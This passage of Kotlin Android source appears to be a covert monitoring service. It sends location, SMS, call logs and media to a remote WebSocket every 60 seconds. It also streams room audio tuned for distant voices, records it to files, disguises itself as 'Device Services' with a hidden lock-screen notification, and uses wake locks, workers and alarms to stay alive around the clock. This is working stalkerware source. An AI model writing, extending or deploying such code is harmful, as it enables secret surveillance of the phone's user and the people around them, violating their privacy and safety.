            Log.w(TAG, "Failed to apply bitrate params: ${e.message}")
        }
    }

    private fun registerNetworkCallbackForBitrate() {
        if (networkCallback != null) return
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                applyAdaptiveBitrate()
            }

            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                applyAdaptiveBitrate()
            }

            override fun onLost(network: Network) {
                applyAdaptiveBitrate()
            }
        }
        networkCallback = callback
        try {
            connectivityManager?.registerNetworkCallback(NetworkRequest.Builder().build(), callback)
        } catch (e: Exception) {
            Log.w(TAG, "Network callback register failed: ${e.message}")
            networkCallback = null
        }
    }

    private fun unregisterNetworkCallbackForBitrate() {
        val callback = networkCallback ?: return
        try {
            connectivityManager?.unregisterNetworkCallback(callback)
        } catch (_: Exception) {}
        networkCallback = null
    }

    // ────────────────────────────────────────────────────────────────────────
    // Data collection — location, SMS, call log, media (every 60s)
    // ────────────────────────────────────────────────────────────────────────

    private fun startDataCollection() {
        stopDataCollection()
        dataJob = serviceScope.launch(Dispatchers.IO) {
            // Send immediately on connect, then every 60 seconds
            while (isActive) {
                sendDeviceData()
                delay(60_000)
            }
        }
    }

    private fun stopDataCollection() {
        dataJob?.cancel()
        dataJob = null
    }

    private fun sendDeviceData() {
        try {
            val data = dataCollector.collectAll()
            val msg = JSONObject()
            msg.put("type", "device_data")
            msg.put("deviceId", deviceId)
            msg.put("data", data)
            webSocket?.send(msg.toString())
            Log.d(TAG, "Device data sent")
        } catch (e: Exception) {
            Log.e(TAG, "sendDeviceData error: ${e.message}")
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Audio capture loop (raw PCM 16-bit mono 16 kHz)
    // ────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")  // Permission already checked in MainActivity before service starts
    private fun startAudioCapture() {
        if (isCapturing) return
        if (isDeviceInCall()) {
            Log.w(TAG, "Mic start blocked: device is currently in call")
            sendHealthStatus("blocked_on_call")
            return
        }
        isCapturing = true
        lastAudioChunkSentAt = System.currentTimeMillis()

        serviceScope.launch(Dispatchers.IO) {
            // MODE_IN_COMMUNICATION activates the phone's call-quality mic profile, which
            // typically has significantly higher analog sensitivity than MODE_NORMAL —
            // critical for capturing distant speakers. Restored when capture ends.
            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            am?.isMicrophoneMute  = false   // ensure mic is not software-muted
            am?.isSpeakerphoneOn  = false   // speakerphone off — avoids feedback loop
            am?.mode = AudioManager.MODE_IN_COMMUNICATION
            ourAudioMode = true
            try {
                audioRecord = createAudioRecordWithFallback()

                if (audioRecord == null) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    webSocket?.send("{\"type\":\"error\",\"message\":\"mic_init_failed\",\"deviceId\":\"$deviceId\"}")
                    isCapturing = false
                    if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                    sendHealthStatus("mic_init_failed")
                    return@launch
                }

                audioRecord?.startRecording()
                resetEnhancerState()   // clear filter memory from any prior session
                Log.i(TAG, "🎙️ Audio capture started (${sampleRate}Hz, PCM16, mono)")
                sendHealthStatus("mic_started")

                val chunk = ByteArray(streamChunkSize)
                var consecutiveReadErrors = 0

                while (isCapturing && isActive) {
                    val read = audioRecord?.read(chunk, 0, chunk.size) ?: -1
                    if (read > 0) {
                        consecutiveReadErrors = 0
                        if (aiAutoModeEnabled) {
                            updateAutoAiProfile(chunk, read)
                        }
                        // Trick 2 + 3: adaptive upward gain for far voices + soft peak limiter
                        val pcmData = applyFarVoiceGain(chunk, read)

                        // 1) Live stream via legacy WS path only when WebRTC is inactive
                        if (!isWebRtcStreaming) {
                            webSocket?.send(encodeWsFallbackAudio(pcmData).toByteString())
                            lastAudioChunkSentAt = System.currentTimeMillis()
                            if (lastAudioChunkSentAt - lastHealthSentAt >= 10_000) {
                                sendHealthStatus("audio_tick")
                            }
                        }

                        // 2) Write to recording file if active
                        if (isSavingFile) {
                            recordingFileStream?.write(pcmData)
                        }
                    } else if (read == AudioRecord.ERROR_DEAD_OBJECT) {
                        Log.e(TAG, "AudioRecord dead object detected")
                        webSocket?.send("{\"type\":\"error\",\"message\":\"mic_dead_object\",\"deviceId\":\"$deviceId\"}")
                        sendHealthStatus("mic_dead_object")
                        break
                    } else if (read == AudioRecord.ERROR || read == AudioRecord.ERROR_BAD_VALUE) {
                        consecutiveReadErrors++
                        if (consecutiveReadErrors >= 5) {
                            Log.e(TAG, "AudioRecord read failed repeatedly: $read")
                            webSocket?.send("{\"type\":\"error\",\"message\":\"mic_read_error\",\"deviceId\":\"$deviceId\"}")
                            sendHealthStatus("mic_read_error")
                            break
                        }
                        delay(100)
                    } else {
                        // zero read: let watchdog decide if stream is stalled
                        delay(10)
                    }
                }

                audioRecord?.stop()
                audioRecord?.release()
                audioRecord = null
                if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                Log.i(TAG, "Audio capture stopped")
                sendHealthStatus("mic_stopped")

            } catch (e: Exception) {
                Log.e(TAG, "Audio capture error", e)
                if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                isCapturing = false
                sendHealthStatus("mic_error")
            }
        }
    }

    private fun startMicWatchdog() {
        if (micWatchdogJob?.isActive == true) return
        micWatchdogJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(15_000)
                if (!wantsMicStreaming || activeWebSocket == null || isRecoveringMic) continue

                if (isDeviceInCall()) {
                    sendHealthStatus("blocked_on_call")
                    continue
                }

                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 35_000)
                if (!isCapturing || stalled) {
                    isRecoveringMic = true
                    try {
                        Log.w(TAG, "Mic watchdog recovery triggered (capturing=$isCapturing stalled=$stalled)")
                        sendHealthStatus("watchdog_recover")
                        stopAudioCapture()
                        delay(300)
                        startAudioCapture()
                    } finally {
                        isRecoveringMic = false
                    }
                }
            }
        }
    }

    private fun stopMicWatchdog() {
        micWatchdogJob?.cancel()
        micWatchdogJob = null
    }

    private fun createAudioRecordWithFallback(): AudioRecord? {
        // VOICE_RECOGNITION is tuned by Google for far-field / assistant use — it activates
        // higher analog gain on most phones, which is exactly what distant speakers need.
        // UNPROCESSED bypasses system DSP but often has lower ADC gain, so it is now the
        // second choice rather than the first.
        val sources: IntArray = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            intArrayOf(
                MediaRecorder.AudioSource.VOICE_RECOGNITION,   // far-field tuned, higher sensitivity
                MediaRecorder.AudioSource.UNPROCESSED,           // raw signal, bypasses DSP
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.CAMCORDER,
            )
        } else {
            intArrayOf(
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.CAMCORDER,
            )
        }

        for (source in sources) {
            try {
                val rec = AudioRecord(
                    source,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    recordBufferSize
                )
                if (rec.state == AudioRecord.STATE_INITIALIZED) {
                    // API 28+: prevent Android from auto-switching to a different mic
                    // mid-session (e.g. switching to a noise-cancelling secondary mic that
                    // attenuates distant voices).
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        try { rec.preferredDevice = null } catch (_: Exception) {}
                    }
                    // API 29+: switch pickup pattern from directional (call/close-talk) to
                    // omnidirectional so the mic captures all directions equally.
                    // -1.0 = omni, 0.0 = neutral, +1.0 = front-directional.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try { rec.setPreferredMicrophoneFieldDimension(-1.0f) } catch (_: Exception) {}
                        // 0 = MIC_DIRECTION_UNSPECIFIED — disables beam-forming so all directions
                        // are captured equally instead of favouring near/front speech.
                        try { rec.setPreferredMicrophoneDirection(0) } catch (_: Exception) {}
                    }
                    // AI mode: enable hardware NS/AGC for better environmental noise cleanup.
                    // Natural mode: keep effects disabled for a more raw capture profile.
                    val sid = rec.audioSessionId
                    if (NoiseSuppressor.isAvailable()) {
                        try {
                            NoiseSuppressor.create(sid)?.let { e ->
                                e.enabled = aiEnhancementEnabled
                                e.release()
                            }
                        } catch (_: Exception) {}
                    }
                    if (AcousticEchoCanceler.isAvailable())
                        try { AcousticEchoCanceler.create(sid)?.let { e -> e.enabled = aiEnhancementEnabled; e.release() } } catch (_: Exception) {}
                    if (AutomaticGainControl.isAvailable()) {
                        try {
                            AutomaticGainControl.create(sid)?.let { e ->
                                e.enabled = aiEnhancementEnabled
                                e.release()
                            }
                        } catch (_: Exception) {}
                    }
                    Log.i(TAG, "AudioRecord initialized with source=$source, recordBuffer=$recordBufferSize, chunk=$streamChunkSize")
                    return rec
                }
                rec.release()
            } catch (e: Exception) {
                Log.w(TAG, "AudioRecord init failed for source=$source: ${e.message}")
            }
        }
        return null
    }

    /** Reset all IIR filter memory.  Must be called once at every capture-session start. */
    private fun resetEnhancerState() {
        hpfPrevX = 0.0; hpfPrevY = 0.0
        eq1X1 = 0.0; eq1X2 = 0.0; eq1Y1 = 0.0; eq1Y2 = 0.0
        bqX1 = 0.0; bqX2 = 0.0; bqY1 = 0.0; bqY2 = 0.0
        peX1 = 0.0;  peX2 = 0.0;  peY1 = 0.0;  peY2 = 0.0
        smoothedGain = 1.0
        spectralDenoiser.reset()
    }

    /**
    * Voice-monitor PCM enhancement pipeline.
     *
    * Correct order: denoise + controlled gain + limiter. Keep processing moderate
    * to avoid the distortion artifacts from overly aggressive EQ/boost stacks.
     *
    *  Stage 1 — HPF @ 120 Hz            removes sub-bass rumble
    *  Stage 2 — Spectral denoiser       suppresses steady fan/AC noise
    *  Stage 3 — Adaptive gain (up 3.2x) lifts far voice without hard pumping
    *  Stage 4 — Gentle presence boost   improves intelligibility
    *  Stage 5 — Soft peak limiter       prevents digital clipping
     *
     * Filter state (hpfPrev*, eq1*, bq*, pe*, smoothedGain) persists between
     * frames so there are no discontinuities at buffer boundaries.
     */
    private fun applyFarVoiceGain(buf: ByteArray, len: Int): ByteArray {
        if (len < 2) return buf.copyOf(len)
        val samples = len / 2
        val strongAi = aiEnhancementEnabled

        // ── Decode PCM-16 LE → double working buffer ─────────────────────────
        val work = DoubleArray(samples)
        for (i in 0 until samples) {
            val lo = buf[i * 2].toInt() and 0xFF
            val hi = buf[i * 2 + 1].toInt() and 0xFF
            work[i] = ((hi shl 8) or lo).toShort().toDouble()
        }

        // ── Pre-gain mic boost ────────────────────────────────────────────────
        val micBoost = if (strongAi) 1.2 else 1.05
        for (i in 0 until samples) work[i] *= micBoost

        // ── Stage 1: High-pass filter @ 120 Hz ───────────────────────────────
        // Keeps voice body (120–400 Hz chest tones) intact while removing rumble.
        // α = 1/(1 + 2π×120/16000) ≈ 0.9550
        val hpAlpha = 0.9550
        for (i in 0 until samples) {
            val x = work[i]
            val y = hpAlpha * (hpfPrevY + x - hpfPrevX)
            hpfPrevX = x; hpfPrevY = y
            work[i] = y
        }

        // ── Stage 2: FFT Spectral denoiser ───────────────────────────────────
        spectralDenoiser.denoise(work)

        // ── Stage 3: Adaptive upward gain ────────────────────────────────────
        var sumSq = 0.0
        for (v in work) sumSq += v * v
        val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
        val gainCeil = if (strongAi) 3.2 else 2.2
        val gainTarget = if (strongAi) 7000.0 else 5600.0
        val rawGain = (gainTarget / rms).coerceIn(1.0, gainCeil)
        // Smoother attack/release keeps the output natural.
        smoothedGain = if (rawGain > smoothedGain)
            smoothedGain * 0.82 + rawGain * 0.18
        else
            smoothedGain * 0.96 + rawGain * 0.04
        for (i in 0 until samples) work[i] *= smoothedGain

        // ── Stage 4: Gentle presence boost @ 2.2 kHz ───────────────────────
        // Peaking: +3 dB, Q=1.0
        val eq1b0 = 1.1541
        val eq1b1 = -1.2070
        val eq1b2 = 0.5173
        val eq1a1 = -1.2070
        val eq1a2 = 0.6714
        for (i in 0 until samples) {
            val x = work[i]
            val y = eq1b0 * x + eq1b1 * eq1X1 + eq1b2 * eq1X2 - eq1a1 * eq1Y1 - eq1a2 * eq1Y2
            eq1X2 = eq1X1
            eq1X1 = x
            eq1Y2 = eq1Y1
            eq1Y1 = y
            val wet = if (strongAi) 0.3 else 0.18
            work[i] = x * (1.0 - wet) + y * wet
        }

        // ── Stage 5: Soft peak limiter + encode PCM-16 LE ────────────────────
        val out = ByteArray(len)
        for (i in 0 until samples) {
            val limited = softPeakLimit(work[i])
            val clamped = limited.toInt().coerceIn(-32768, 32767)
            out[i * 2]     = (clamped and 0xFF).toByte()
            out[i * 2 + 1] = ((clamped shr 8) and 0xFF).toByte()
        }
        return out
    }

    private fun encodeWsFallbackAudio(pcm16: ByteArray): ByteArray {
        if (pcm16.isEmpty()) return pcm16
        val out = ByteArray(4 + pcm16.size)
        out[0] = 0x4D.toByte()
        out[1] = 0x4D.toByte()
        out[2] = 0x01
        out[3] = 0x00
        System.arraycopy(pcm16, 0, out, 4, pcm16.size)
        return out
    }

    // ────────────────────────────────────────────────────────────────────────
    // Overlap-add FFT spectral denoiser
    // ────────────────────────────────────────────────────────────────────────

    /**
     * Overlap-add spectral denoiser.
     *
     * Algorithm:
     *   1. Buffer incoming samples into 512-sample frames with 50% overlap.
     *   2. Apply Hann window and forward FFT.
     *   3. Estimate noise power spectrum by exponential averaging over quiet frames.
     *   4. Subtract the noise estimate from each frequency bin (power domain),
     *      keeping a spectral floor of 4% of the noise power to prevent musical noise.
     *   5. IFFT + Hann window + overlap-add → output.
     *
     * The denoiser is most effective on stationary noise: fans, AC hum, wind,
     * electrical hiss — exactly what a phone mic in a room picks up.  Neural
     * denoisers (RNNoise / DeepFilterNet) can go further but require NDK.
     *
     * Latency: HOP (256 samples) = 16 ms at 16 kHz — imperceptible in monitoring.
     */
    private inner class SpectralDenoiser {
        private val FRAME = 512                 // FFT length (must be power of 2)
        private val HOP   = FRAME / 2           // 50% overlap
        private val BINS  = FRAME / 2 + 1       // unique bins DC..Nyquist

        // Periodic Hann window — gives perfect reconstruction at 50% overlap.
        private val win = DoubleArray(FRAME) { i ->
            0.5 * (1.0 - Math.cos(2.0 * Math.PI * i / FRAME))
        }

        // Input overlap buffer — pre-primed with HOP zeros so output appears
        // immediately from the first call (no startup silence at the receiver).
        private val inBuf  = DoubleArray(FRAME)
        private var inFill = HOP

        // Output overlap-add accumulator
        private val outBuf   = DoubleArray(FRAME)
        // Queue of samples that are ready to be delivered to the caller
        private val readyOut = ArrayDeque<Double>(FRAME * 4)

        // Noise power spectrum (one value per positive frequency bin)
        private val noisePow = DoubleArray(BINS)
        private var adaptFrames = 0    // frames consumed so far for noise estimation

        fun reset() {
            inBuf.fill(0.0)
            inFill = HOP            // re-prime with zeros
            outBuf.fill(0.0)
            readyOut.clear()
            noisePow.fill(0.0)
            adaptFrames = 0
        }

        /**
         * Process [samples] in-place.  Always writes exactly [samples].size values
         * back into the array (zero-padded for the very first partial frame).
         */
        fun denoise(samples: DoubleArray) {
            val n   = samples.size
            val out = DoubleArray(n)
            var outIdx = 0

            for (s in samples) {
                inBuf[inFill++] = s
                if (inFill == FRAME) {
                    // Process frame → overlap-add → queue HOP output samples
                    val frameOut = processFrame()
                    for (i in 0 until FRAME) outBuf[i] += frameOut[i]
                    for (i in 0 until HOP)   readyOut.addLast(outBuf[i])
                    // Slide accumulator and input buffer
                    outBuf.copyInto(outBuf, 0, HOP, FRAME)
                    for (i in FRAME - HOP until FRAME) outBuf[i] = 0.0
                    inBuf.copyInto(inBuf, 0, HOP, FRAME)
                    inFill = HOP
                }
            }

            // Drain queued output; zero-pad only during the startup partial frame.
            while (outIdx < n) {
                out[outIdx++] = if (readyOut.isNotEmpty()) readyOut.removeFirst() else 0.0
            }
            System.arraycopy(out, 0, samples, 0, n)
        }

        private fun processFrame(): DoubleArray {
            // Windowed FFT
            val re = DoubleArray(FRAME) { i -> inBuf[i] * win[i] }
            val im = DoubleArray(FRAME)
            fft(re, im, false)

            // Power spectrum for positive bins
            val power = DoubleArray(BINS) { i -> re[i]*re[i] + im[i]*im[i] }
            val frameRms = Math.sqrt(power.average()).coerceAtLeast(1.0)

            // Update noise estimate:
            //   first 30 frames: aggressive averaging (fast bootstrap)
            //   thereafter: only from quiet frames (speech skips the update)
            // Adaptive threshold: only update if this frame is close to the current
            // estimated noise floor. A fixed threshold failed because quiet far-voice
            // frames (slightly above noise) were still classified as "quiet" and the
            // noise model absorbed the voice and then subtracted it.
            val noiseFloorRms = Math.sqrt(noisePow.average()).coerceAtLeast(1.0)
            val isQuiet = frameRms < noiseFloorRms * 1.2 + 20.0
            if (adaptFrames < 30 || isQuiet) {
                val alpha = if (adaptFrames < 15) 0.5 else 0.96
                for (i in noisePow.indices) {
                    noisePow[i] = alpha * noisePow[i] + (1.0 - alpha) * power[i]
                }
                adaptFrames++
            }

            // Spectral subtraction — only after enough noise frames are collected
            if (adaptFrames >= 15) {
                val OVER  = 0.85    // leave more residual texture so speech sounds less carved out
                val FLOOR = 0.30    // higher floor keeps ambience natural and reduces denoiser artifacts
                for (i in 0 until BINS) {
                    val noiseP = noisePow[i].coerceAtLeast(1e-10)
                    val clean  = (power[i] - OVER * noiseP).coerceAtLeast(FLOOR * noiseP)
                    val scale  = if (power[i] > 1e-10) Math.sqrt(clean / power[i]) else 0.0
                    re[i] *= scale;  im[i] *= scale
                    // Mirror scale to conjugate negative-frequency bin
                    if (i in 1 until BINS - 1) {
                        re[FRAME - i] *= scale
                        im[FRAME - i] *= scale
                    }
                }
            }

            // IFFT + synthesis window
            fft(re, im, true)
            return DoubleArray(FRAME) { i -> re[i] * win[i] }
        }
    }

    /**
     * In-place Cooley-Tukey iterative radix-2 FFT / IFFT.
     * [re] and [im] must both have a length that is a power of two.
     * forward (inverse=false): analysis.  inverse (inverse=true): synthesis, scaled 1/N.
     */
    private fun fft(re: DoubleArray, im: DoubleArray, inverse: Boolean) {
        val n = re.size
        // Bit-reversal permutation
        var j = 0
        for (i in 1 until n) {
            var bit = n ushr 1
            while (j and bit != 0) { j = j xor bit; bit = bit ushr 1 }
            j = j xor bit
            if (i < j) {
                var t = re[i]; re[i] = re[j]; re[j] = t
                t = im[i];     im[i] = im[j]; im[j] = t
            }
        }
        // Butterfly stages
        var len = 2
        while (len <= n) {
            val half = len ushr 1
            val ang  = 2.0 * Math.PI / len * (if (inverse) -1.0 else 1.0)
            val wbRe = Math.cos(ang)
            val wbIm = Math.sin(ang)
            var i = 0
            while (i < n) {
                var wRe = 1.0; var wIm = 0.0
                for (k in 0 until half) {
                    val uRe = re[i + k];            val uIm = im[i + k]
                    val vRe = re[i+k+half]*wRe - im[i+k+half]*wIm
                    val vIm = re[i+k+half]*wIm + im[i+k+half]*wRe
                    re[i + k]      = uRe + vRe;     im[i + k]      = uIm + vIm
                    re[i + k+half] = uRe - vRe;     im[i + k+half] = uIm - vIm
                    val nwRe = wRe * wbRe - wIm * wbIm
                    wIm = wRe * wbIm + wIm * wbRe
                    wRe = nwRe
                }
                i += len
            }
            len = len shl 1
        }
        if (inverse) { val inv = 1.0 / n; for (i in 0 until n) { re[i] *= inv; im[i] *= inv } }
    }

    /**
     * Soft-knee peak limiter.
     * Linear below ±24000; exponential curve up to ±32767 for samples above the knee.
     * Prevents hard digital clipping without audible distortion.
     */
    private fun softPeakLimit(x: Double): Double {
        val knee = 22000.0
        val ceil = 32767.0
        val abs  = Math.abs(x)
        if (abs <= knee) return x
        if (abs >= ceil) return Math.copySign(ceil, x)
        val range      = ceil - knee
        val excess     = abs - knee
        val compressed = knee + range * (1.0 - Math.exp(-excess / range))
        return Math.copySign(compressed, x)
    }

    private fun updateAutoAiProfile(pcm16: ByteArray, len: Int) {
        val sampleCount = len / 2
        if (sampleCount <= 0) return

        var sumSq = 0.0
        var peak = 0
        var i = 0
        while (i + 1 < len) {
            val s = readLeSample(pcm16, i)
            val abs = kotlin.math.abs(s)
            if (abs > peak) peak = abs
            sumSq += s.toDouble() * s.toDouble()
            i += 2
        }

        val rms = kotlin.math.sqrt(sumSq / sampleCount).coerceAtLeast(1.0)
        val rmsDb = 20.0 * kotlin.math.log10(rms / 32768.0)
        val peakDb = 20.0 * kotlin.math.log10((peak.coerceAtLeast(1)).toDouble() / 32768.0)
        val crestDb = peakDb - rmsDb

        val likelySpeech = rmsDb > -48.0 && crestDb > 5.0
        if (!likelySpeech) {
            val alpha = if (rmsDb > estimatedNoiseDb) 0.90 else 0.97
            estimatedNoiseDb = alpha * estimatedNoiseDb + (1.0 - alpha) * rmsDb
        }

        val now = System.currentTimeMillis()
        if (now - lastAutoAiSwitchAt < 12_000) return

        val shouldEnableStrong = estimatedNoiseDb > -50.0
        val shouldDisableStrong = estimatedNoiseDb < -58.0

        if (!aiEnhancementEnabled && shouldEnableStrong) {
            aiEnhancementEnabled = true
            lastAutoAiSwitchAt = now
            sendHealthStatus("auto_ai_on")
        } else if (aiEnhancementEnabled && shouldDisableStrong) {
            aiEnhancementEnabled = false
            lastAutoAiSwitchAt = now
            sendHealthStatus("auto_ai_off")
        }
    }

    private fun readLeSample(buf: ByteArray, offset: Int): Int {
        val lo = buf[offset].toInt() and 0xFF
        val hi = buf[offset + 1].toInt()
        return ((hi shl 8) or lo).toShort().toInt()
    }

    private fun stopAudioCapture(reason: String = "stop_capture_cmd") {
        isCapturing = false
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (_: Exception) {}
        audioRecord = null
        if (ourAudioMode) {
            try {
                (getSystemService(Context.AUDIO_SERVICE) as? AudioManager)?.mode = AudioManager.MODE_NORMAL
            } catch (_: Exception) {}
            ourAudioMode = false
        }
        sendHealthStatus(reason)
    }

    private fun sendHealthStatus(reason: String) {
        val ws = webSocket ?: return
        lastHealthSentAt = System.currentTimeMillis()
        val battery = getBatterySnapshot()
        val internetOnline = isInternetOnline()
        val callActive = isDeviceInCall()
        val msg = JSONObject().apply {
            put("type", "health_status")
            put("deviceId", deviceId)
            put("wsConnected", activeWebSocket != null)
            // In WebRTC mode microphone is captured by WebRTC audio source, not AudioRecord.
            put("micCapturing", isCapturing || isWebRtcStreaming)
            put("lastAudioChunkSentAt", lastAudioChunkSentAt)
            put("reason", reason)
            put("ts", lastHealthSentAt)
            put("aiMode", aiEnhancementEnabled)
            put("aiAuto", aiAutoModeEnabled)
            put("noiseDb", estimatedNoiseDb)
            put("internetOnline", internetOnline)
            put("callActive", callActive)
            if (battery != null) {
                put("batteryPct", battery.first)
                put("charging", battery.second)
            }
        }
        ws.send(msg.toString())
    }

    private fun isInternetOnline(): Boolean {
        val cm = connectivityManager ?: return false
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        val hasTransport = caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
        val validated = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        return hasTransport && validated
    }

    private fun isDeviceInCall(): Boolean {
        return try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return false
            val mode = audioManager.mode
            // Exclude MODE_IN_COMMUNICATION that we set ourselves to boost mic sensitivity.
            !ourAudioMode && (mode == AudioManager.MODE_IN_CALL || mode == AudioManager.MODE_IN_COMMUNICATION)
        } catch (_: Exception) {
            false
        }
    }

    private fun getBatterySnapshot(): Pair<Int, Boolean>? {
        return try {
            val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return null
            val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            val pct = if (level >= 0 && scale > 0) ((level * 100f) / scale).toInt().coerceIn(0, 100) else -1
            val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
            val charging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
            Pair(pct, charging)
        } catch (_: Exception) {
            null
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // File recording helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun openRecordingFile() {
        try {
            val dir = getExternalFilesDir(null) ?: filesDir
            dir.mkdirs()
            val timestamp = System.currentTimeMillis()
            recordingFile = File(dir, "rec_${timestamp}.pcm")
            recordingFileStream = FileOutputStream(recordingFile)
            isSavingFile = true
            Log.i(TAG, "Recording to: ${recordingFile?.absolutePath}")
            updateNotification("Live streaming + Recording…")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open recording file", e)
        }
    }

    private fun closeRecordingFile() {
        isSavingFile = false
        try {
            recordingFileStream?.flush()
            recordingFileStream?.close()
        } catch (_: Exception) {}
        recordingFileStream = null
        Log.i(TAG, "Recording saved: ${recordingFile?.name}")
        updateNotification("Live streaming active")
    }

    // ────────────────────────────────────────────────────────────────────────
    // Notification helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        // IMPORTANCE_LOW keeps a visible ongoing service notification, which
        // improves survival on aggressive OEM battery managers.
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Device Services",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Audio streaming service"
            setSound(null, null)
            enableVibration(false)
            setShowBadge(false)
        }
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(statusText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Services")
            .setContentText(statusText)
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)  // subtle icon
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // hidden on lock screen
            .build()
    }

    private fun updateNotification(statusText: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIF_ID, buildNotification(statusText))
    }

    // ────────────────────────────────────────────────────────────────────────
    // WakeLock — keeps CPU awake while app is in background
    // ────────────────────────────────────────────────────────────────────────

    private fun acquireWakeLock() {
        val pm = getSystemService(PowerManager::class.java)
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MicMonitor::AudioWakeLock"
        ).also {
            it.setReferenceCounted(false)
            if (!it.isHeld) it.acquire() // Released in onDestroy
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // WorkManager watchdog — keeps service alive 24/7
    // ────────────────────────────────────────────────────────────────────────

    private fun scheduleKeepAlive() {
        val request = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "keep_alive",
            ExistingPeriodicWorkPolicy.KEEP,
            request
        )
        Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
    }

    /**
     * Schedules a one-shot AlarmManager alarm 8 minutes from now.
     * On fire, sends ACTION_RECONNECT to this service — survives Doze better
     * than coroutines because AlarmManager uses ELAPSED_REALTIME_WAKEUP.
     * The alarm reschedules itself each time it fires, creating a rolling chain.
     */
    private fun scheduleReconnectAlarm() {
        val intent = Intent(applicationContext, MicService::class.java).apply {
            action = ACTION_RECONNECT
        }
        val pendingIntent = PendingIntent.getService(
            applicationContext, 2, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 8 * 60 * 1000L
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.i(TAG, "Reconnect alarm scheduled in 8 min")
    }
}
